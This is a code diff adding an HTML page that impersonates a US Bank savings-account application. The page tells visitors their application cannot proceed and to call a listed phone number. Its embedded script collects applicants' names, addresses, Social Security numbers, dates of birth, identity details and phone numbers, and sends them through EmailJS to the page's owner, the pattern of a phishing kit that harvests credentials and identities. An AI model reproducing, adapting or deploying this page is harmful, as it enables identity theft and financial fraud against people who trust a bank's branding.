@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en" class="hydrated" style="--emulation-banner-height: 0px;">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>US Bank Savings Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        .flexpage {
+            background-color: #fff;
+            box-shadow: 2px 3px 2px solid;
+            padding: 20px;
+            margin: auto;
+            margin-top: 40px;
+            box-shadow: rgba(0, 0, 0, 0.05) 0px 0px 0px 1px;
+
+        }
+
+        .flexpage1 {
+            background-color: #fff;
+            box-shadow: 2px 3px 2px solid;
+            padding: 20px;
+            margin: auto;
+            margin-top: 40px;
+        }
+
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+
+        }
+
+        .fleximg {
+            display: flex;
+            justify-content: space-between;
+            background-color: #fff;
+            margin: 0 auto;
+            padding: 30px;
+        }
+
+        img {
+            width: 100px;
+            max-width: 100%;
+        }
+
+        a {
+            color: black;
+            text-decoration: none;
+            font-weight: bolder;
+            font-size: large;
+        }
+
+        a:hover {
+            color: #0073e6;
+            text-decoration: underline;
+        }
+
+        .form {
+            width: 100%;
+            display: flex;
+            gap: 20px;
+            justify-content: space-evenly;
+        }
+
+        .form1 {
+            display: flex;
+            justify-content: flex-start;
+            gap: 20px;
+
+        }
+
+        h1 {
+            margin-top: 50px;
+            text-align: left;
+            color: black;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin: 5px 0;
+            display: flex;
+            align-items: centere;
+            gap: 5px;
+
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            height: 60px;
+            border: 1px solid #d2d2d2;
+            border-radius: 6px;
+        }
+
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+        }
+
+        .form-group button {
+            padding: 20px;
+            background-color: #371ca1;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        .form-group button:hover {
+            background-color: #371ca1;
+        }
+
+        .certification {
+            margin-top: 20px;
+            font-style: italic;
+        }
+
+        .button {
+            padding: 20px;
+            margin-top: 30px;
+            border-radius: 5px;
+            color: white;
+            width: 100%;
+
+        }
+
+        .button-l {
+            max-width: max-content;
+            margin-top: 40px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+
+        }
+
+        .radioicon {
+            display: flex;
+            justify-content: flex-start;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .contact-info {
+            margin-top: 80px;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .footer a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .statusbar {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+            padding: 30px 0;
+        }
+
+        .statusbar .dot {
+            height: 12px;
+            width: 14px;
+            border-radius: 50%;
+            background-color: #7c7c7c;
+            margin: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .statusbar .dot.active {
+            background-color: #87d550;
+        }
+
+        .statusbar .dot.active::after {
+            position: absolute;
+            content: ' ';
+            height: 28px;
+            width: 28px;
+            border: 1px solid #87d550;
+            border-radius: 50%;
+        }
+
+        .statusbar .line {
+            max-width: calc(50% - 125px) / 2;
+            width: 50%;
+            height: 1px;
+            background-color: #7c7c7c;
+            display: block;
+        }
+
+        
+        .statusbar .line.active { 
+
+background-color: #87d550;
+}
+
+        header {
+            max-width: 100%;
+            padding: 15px 25px;
+            background-color: #fff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: rgba(0, 0, 0, 0.05) 0px 6px 24px 0px, rgba(0, 0, 0, 0.08) 0px 0px 0px 1px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div>
+            <a>
+                <img src="https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo.png">
+            </a>
+        </div>
+        <div>
+            <p>Already have an account with us <a href="#">Login</a></p>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <div class="statusbar">
+            <div class="dot active"></div>
+            <div class="line active"></div>
+            <div class="dot active"></div>
+            <div class="line active"></div>
+            <div class="dot active"></div>
+
+
+        </div>
+    </div>
+
+    <div class="container">
+
+            <h1 style="text-align: center; font-weight: 300;">You may not proceed with your Applicaiton</h1>
+
+            <br>
+            <div class="flexpage" 
+          
+            >
+                <h3 style="text-align: center; font-weight: 300;">if you wish to continue, please contact a Customer Success Manager at 866.518.0286 who can help.</h3>
+
+            </div>
+
+            <br>
+
+            <hr style="opacity: 0.6;">
+            <br>
+
+
+            <a href="#" style="color: #371ca1; text-align: center; display: block;">Save & Exit</a>
+
+    </div>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script>
+        // Initialize EmailJS with your user ID
+        (function () {
+            emailjs.init("dLES0ktdPRK1iuHaY"); // Replace with your EmailJS User ID
+        })();
+
+        // Function to collect the form data and send it via EmailJS
+        function sendFormData(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            // Get form data
+            const formData = new FormData(document.getElementById("myForm"));
+
+            const formObj = {};
+            formData.forEach((value, key) => {
+                formObj[key] = value;
+            });
+
+            // Prepare the email parameters
+            const emailParams = {
+                from_name: formObj.firstName + " " + formObj.lastName, // Combine first name and last name
+                email: formObj.email,
+                productCode: formObj.productCode,
+                refId: formObj.refId,
+                liveoakProdCSACd: formObj.liveoakProdCSACd,
+                firstName: formObj.firstName,
+                middleName: formObj.middleName,
+                lastName: formObj.lastName,
+                suffix: formObj.suffix,
+                address1: formObj.address1,
+                address2: formObj.address2,
+                city: formObj.city,
+                state: formObj.state,
+                zipCode: formObj.zipCode,
+                yearsAtAddress: formObj.yearsAtAddress,
+                ssn: formObj.ssn,
+                dob: formObj.dob,
+                identity: formObj.identity,
+                w9Withholdings: formObj.w9Withholdings ? "Yes" : "No",
+                mobilePhone: formObj.mobilePhone,
+                homePhone: formObj.homePhone,
+                employmentStatus: formObj.employmentStatus,
+                occupation: formObj.occupation,
+                politicalFigure1: formObj.politicalFigure1,
+                politicalFigure2: formObj.politicalFigure2,
+                certify: formObj.certify ? "Yes" : "No"
+            };
+
+            // Send the email using EmailJS
+            emailjs.send("service_rknot18", "template_dzog7k9", emailParams)
+                .then(function (response) {
+                    alert('Form submitted successfully!');
+                    console.log('Email sent successfully:', response);
+                }, function (error) {
+                    alert('Failed to send form data.');
+                    console.log('Email sending error:', error);
+                });
+        }
+    </script>
+</body>
+
+</html>
